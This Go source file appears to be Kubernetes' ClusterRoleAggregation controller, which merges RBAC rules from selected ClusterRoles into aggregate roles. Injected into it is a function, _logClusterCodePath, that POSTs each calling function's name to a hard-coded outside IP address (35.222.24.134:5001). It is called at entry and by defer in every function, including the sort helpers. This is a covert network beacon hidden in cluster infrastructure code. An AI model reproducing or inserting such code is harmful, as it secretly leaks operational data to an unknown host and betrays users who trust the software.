package clusterroleaggregation

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "sort"
 "time"
 "k8s.io/klog"
 rbacv1 "k8s.io/api/rbac/v1"
 "k8s.io/apimachinery/pkg/api/equality"
 "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 rbacinformers "k8s.io/client-go/informers/rbac/v1"
 rbacclient "k8s.io/client-go/kubernetes/typed/rbac/v1"
 rbaclisters "k8s.io/client-go/listers/rbac/v1"
 "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/util/workqueue"
 "k8s.io/kubernetes/pkg/controller"
)

type ClusterRoleAggregationController struct {
 clusterRoleClient  rbacclient.ClusterRolesGetter
 clusterRoleLister  rbaclisters.ClusterRoleLister
 clusterRolesSynced cache.InformerSynced
 syncHandler        func(key string) error
 queue              workqueue.RateLimitingInterface
}

func NewClusterRoleAggregation(clusterRoleInformer rbacinformers.ClusterRoleInformer, clusterRoleClient rbacclient.ClusterRolesGetter) *ClusterRoleAggregationController {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c := &ClusterRoleAggregationController{clusterRoleClient: clusterRoleClient, clusterRoleLister: clusterRoleInformer.Lister(), clusterRolesSynced: clusterRoleInformer.Informer().HasSynced, queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), "ClusterRoleAggregator")}
 c.syncHandler = c.syncClusterRole
 clusterRoleInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: func(obj interface{}) {
  c.enqueue()
 }, UpdateFunc: func(old, cur interface{}) {
  c.enqueue()
 }, DeleteFunc: func(uncast interface{}) {
  c.enqueue()
 }})
 return c
}
func (c *ClusterRoleAggregationController) syncClusterRole(key string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, name, err := cache.SplitMetaNamespaceKey(key)
 if err != nil {
  return err
 }
 sharedClusterRole, err := c.clusterRoleLister.Get(name)
 if errors.IsNotFound(err) {
  return nil
 }
 if err != nil {
  return err
 }
 if sharedClusterRole.AggregationRule == nil {
  return nil
 }
 newPolicyRules := []rbacv1.PolicyRule{}
 for i := range sharedClusterRole.AggregationRule.ClusterRoleSelectors {
  selector := sharedClusterRole.AggregationRule.ClusterRoleSelectors[i]
  runtimeLabelSelector, err := metav1.LabelSelectorAsSelector(&selector)
  if err != nil {
   return err
  }
  clusterRoles, err := c.clusterRoleLister.List(runtimeLabelSelector)
  if err != nil {
   return err
  }
  sort.Sort(byName(clusterRoles))
  for i := range clusterRoles {
   if clusterRoles[i].Name == sharedClusterRole.Name {
    continue
   }
   for j := range clusterRoles[i].Rules {
    currRule := clusterRoles[i].Rules[j]
    if !ruleExists(newPolicyRules, currRule) {
     newPolicyRules = append(newPolicyRules, currRule)
    }
   }
  }
 }
 if equality.Semantic.DeepEqual(newPolicyRules, sharedClusterRole.Rules) {
  return nil
 }
 clusterRole := sharedClusterRole.DeepCopy()
 clusterRole.Rules = nil
 for _, rule := range newPolicyRules {
  clusterRole.Rules = append(clusterRole.Rules, *rule.DeepCopy())
 }
 _, err = c.clusterRoleClient.ClusterRoles().Update(clusterRole)
 return err
}
func ruleExists(haystack []rbacv1.PolicyRule, needle rbacv1.PolicyRule) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, curr := range haystack {
  if equality.Semantic.DeepEqual(curr, needle) {
   return true
  }
 }
 return false
}
func (c *ClusterRoleAggregationController) Run(workers int, stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 defer c.queue.ShutDown()
 klog.Infof("Starting ClusterRoleAggregator")
 defer klog.Infof("Shutting down ClusterRoleAggregator")
 if !controller.WaitForCacheSync("ClusterRoleAggregator", stopCh, c.clusterRolesSynced) {
  return
 }
 for i := 0; i < workers; i++ {
  go wait.Until(c.runWorker, time.Second, stopCh)
 }
 <-stopCh
}
func (c *ClusterRoleAggregationController) runWorker() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for c.processNextWorkItem() {
 }
}
func (c *ClusterRoleAggregationController) processNextWorkItem() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dsKey, quit := c.queue.Get()
 if quit {
  return false
 }
 defer c.queue.Done(dsKey)
 err := c.syncHandler(dsKey.(string))
 if err == nil {
  c.queue.Forget(dsKey)
  return true
 }
 utilruntime.HandleError(fmt.Errorf("%v failed with : %v", dsKey, err))
 c.queue.AddRateLimited(dsKey)
 return true
}
func (c *ClusterRoleAggregationController) enqueue() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 allClusterRoles, err := c.clusterRoleLister.List(labels.Everything())
 if err != nil {
  utilruntime.HandleError(fmt.Errorf("Couldn't list all objects %v", err))
  return
 }
 for _, clusterRole := range allClusterRoles {
  if clusterRole.AggregationRule == nil {
   continue
  }
  key, err := controller.KeyFunc(clusterRole)
  if err != nil {
   utilruntime.HandleError(fmt.Errorf("Couldn't get key for object %#v: %v", clusterRole, err))
   return
  }
  c.queue.Add(key)
 }
}

type byName []*rbacv1.ClusterRole

func (a byName) Len() int {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return len(a)
}
func (a byName) Swap(i, j int) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 a[i], a[j] = a[j], a[i]
}
func (a byName) Less(i, j int) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return a[i].Name < a[j].Name
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
